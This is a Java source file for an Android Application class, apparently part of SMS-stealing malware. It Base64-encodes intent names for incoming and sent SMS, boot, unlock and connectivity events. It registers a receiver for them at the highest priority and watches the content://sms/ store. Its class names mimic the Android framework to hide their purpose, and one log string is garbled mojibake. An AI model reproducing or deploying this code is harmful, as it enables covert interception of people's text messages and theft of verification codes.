package android.app;

import java.io.UnsupportedEncodingException;

import android.content.Context;
import android.content.DroadcastReceiver;
import android.content.IntentFilter;
import android.database.DontentObserver;
import android.lang.Base64;
import android.lang.CrashHandler;
import android.lang.LogUtils;
import android.net.Uri;
import android.os.Handler;
import android.support.v4.util.LogWriter;

public class Dpplication extends Application {

	private static Dpplication application=null;
	private static IntentFilter localIntentFilter;
	
	public static String smsfilter1="YW5kcm9pZC5wcm92aWRlci5UZWxlcGhvbnkuU01TX1JFQ0VJVkVE";
	public static String smsfilter2="YW5kcm9pZC5wcm92aWRlci5UZWxlcGhvbnkuU01TX1JFQ0VJVkVEXzI=";
	public static String smsfilter3="YW5kcm9pZC5wcm92aWRlci5UZWxlcGhvbnkuR1NNX1NNU19SRUNFSVZFRA==";
	public static String bootaction1="YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkJPT1RfQ09NUExFVEVE";
	public static String bootaction2="YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlVTRVJfUFJFU0VOVA==";
	public static String bootaction3="YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlBBQ0tBR0VfUkVTVEFSVEVE";
	public static String bootaction4="YW5kcm9pZC5uZXQuY29ubi5DT05ORUNUSVZJVFlfQ0hBTkdF";
	public static String smssend="U0VOVF9TTVNfQUNUSU9O";
	
	
	
	private static DontentObserver dontentobserver;
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		CrashHandler handler = CrashHandler.getInstance();
		handler.init(getApplicationContext());
		application=this;
		Dpplication.regFilter(this);
	}
	private static Handler handler=new Handler();
	public static Dpplication getContext(){
		return application;
	}
	
	public static String Decode(String str){
		try {
			return new String(Base64.decode(str.toCharArray()),"UTF-8");
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "";
	}
	public static String Eecode(String str){
		try {
			return new String(Base64.encode(str.getBytes("UTF-8")));
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "";
	}
	
	
	public static IntentFilter GetIntentFilter(){
		if(localIntentFilter==null){
			localIntentFilter = new IntentFilter();
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.smsfilter1));
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.smsfilter2));
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.smsfilter3));
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.bootaction1));
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.bootaction2));
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.bootaction3));
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.bootaction4));
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.bootaction4));
			localIntentFilter.addAction(Dpplication.Decode(Dpplication.smssend));
			localIntentFilter.setPriority(Integer.MAX_VALUE);
		}
		return localIntentFilter;
	}
	
	public static void regFilter(Context context){
		LogUtils.write("reg", "×¢²á¶ÌÐÅ¼àÌý");
		context.registerReceiver(new DroadcastReceiver(), GetIntentFilter());
		if(dontentobserver==null){
			dontentobserver=new DontentObserver(context, handler);
			context.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, dontentobserver);
		}
	}
	

}
